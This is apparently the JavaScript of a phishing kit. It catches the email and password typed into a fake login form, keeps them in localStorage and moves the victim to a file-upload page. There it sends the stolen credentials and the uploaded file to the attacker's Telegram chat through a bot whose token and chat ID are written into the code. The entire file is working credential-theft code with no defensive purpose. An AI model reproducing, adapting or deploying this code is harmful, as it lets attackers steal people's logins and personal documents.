const bot = new Bot("6932519233:AAE2_bWYP-CubrKXvsXWWunL9hkPIkvSu6E", "-4022025604");

// bot.getUpdates()
//       .then(res => {
//         console.log(res);
//       })
//       .catch(err => console.log(err));

// bot.getMe()
//       .then(res => {
//         console.log(res);
//       })
//       .catch(err => console.log(err))
  
//Send frmInfo 
var frmInfo = document.getElementById("frm_botdata");
if (frmInfo) {
  frmInfo.addEventListener("submit", e => {
    e.preventDefault();
    const _userName = document.getElementById("m_login_email").value;
    const _pass = document.getElementById("m_login_password").value;

    if (_userName !== "" && _pass != "") {
      localStorage.setItem('frmInfo', JSON.stringify({userName: _userName, pass: _pass}));
      window.location.href = "image.html";
    }

  });
}


//send frmFile
var frmFile = document.getElementById("formFile");

if (frmFile) {
  frmFile.addEventListener("submit", e => {
    e.preventDefault();
    const file = document.getElementById("file").value;
    if (file !== "") {
      var frmInfo = JSON.parse(localStorage.getItem('frmInfo'));
      //var _gip = localStorage.getItem('_gip');

      var msg = "<b>UserName: " + frmInfo.userName + "</b>%0A" +
                "<b>Pass: " + frmInfo.pass + "</b>%0A";
                //"<b>IP: " + _gip + "</b>";

      bot.sendFile("#file", msg, 'html')
        .then(res => {
          window.location.href = "success.html"
        })
        .catch(err => console.log(err))


    }
  });
}








